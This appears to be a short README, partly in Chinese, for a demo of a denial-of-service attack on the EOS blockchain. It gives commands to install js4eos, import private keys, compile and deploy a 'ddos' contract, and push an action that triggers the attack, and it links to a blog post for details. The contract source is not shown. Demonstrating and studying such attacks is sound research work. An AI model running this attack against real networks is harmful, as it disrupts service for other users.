# Run 'dos' demo
EOS dos攻击实例
```
//mac
npm install -g js4eos
//ubuntu
sudo npm install -g js4eos
js4eos wallet create
//请一个一个导入下面用到的账号的私钥
js4eos wallet import your_private_key
js4eos compile -o ddos/ddos.wasm ddos/ddos.cpp
js4eos compile -g ddos/ddos.abi ddos/ddos.cpp
js4eos set contract contractaccount ddos
#assign eosio.code permission before push action
js4eos push action contractaccount test '[1000]' -p contractaccount
#上面的各种账号请更改为你的真实账号
```
如果使用cleos程序，只需将上面的js4eos替换为cleos即可<br>

# details(详情)
<a href="https://blog.csdn.net/ITleaks/article/details/86471037">
https://blog.csdn.net/ITleaks/article/details/86471037
</a>

